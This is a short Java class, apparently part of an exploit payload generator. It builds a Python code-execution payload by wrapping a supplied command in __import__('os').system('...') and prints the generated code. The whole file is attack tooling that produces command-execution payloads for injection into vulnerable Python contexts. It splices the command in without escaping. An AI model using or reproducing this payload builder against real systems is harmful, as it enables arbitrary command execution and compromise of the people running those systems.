package com.ppp.sinks;

import com.ppp.Printer;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;

/**
 * @author Whoopsunix
 */
@Sink({Sink.Python})
public class Python {
    @EnchantType({EnchantType.DEFAULT})
    public String defaultPythonCode(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();
        Printer.yellowInfo("command: " + command);
        String result = String.format("__import__('os').system('%s')", command);
        Printer.blueInfo("Python code: " + result);

        return result;
    }
}
